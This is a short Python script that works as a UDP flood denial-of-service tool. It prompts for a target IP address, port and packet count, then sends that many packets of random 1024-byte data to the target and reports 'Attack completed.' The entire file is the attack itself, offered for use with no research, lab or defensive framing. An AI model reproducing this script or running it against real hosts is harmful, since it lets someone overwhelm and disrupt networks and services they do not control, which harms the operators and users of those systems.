import socket
import ipaddress
import random
import sys

def udpattack(targetip, targetport, packetnumbers):
    try:
        udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        data = bytearray(random.getrandbits(8) for _ in range(1024))

        for _ in range(packetnumbers):
            udp_socket.sendto(data, (targetip, targetport))

        print("Attack completed.")
    except Exception as e:
        print("Error during UDP attack:", e)
    finally:
        if 'udp_socket' in locals():
            udp_socket.close()

if __name__ == "__main__":
    try:
        targetip = input("Please type IP Target to attack: ")
        try:
            ipaddress.ip_address(targetip)
        except ValueError:
            print("Error: invalid IP Address.")
            sys.exit(1)

        targetport = int(input("Please type Target Port: "))
        if not (1 <= targetport <= 65535):
            print("Error: port value must be between 1 and 65535.")
            sys.exit(1)

        packetnumbers = int(input("Please type the amount of packets you want to send: "))
        if packetnumbers <= 0:
            print("Error: the amount of packets must be greater than 0.")
            sys.exit(1)

        udpattack(targetip, targetport, packetnumbers)
    except ValueError:
        print("Error: please check your input (port and number of packets to send).")
        sys.exit(1)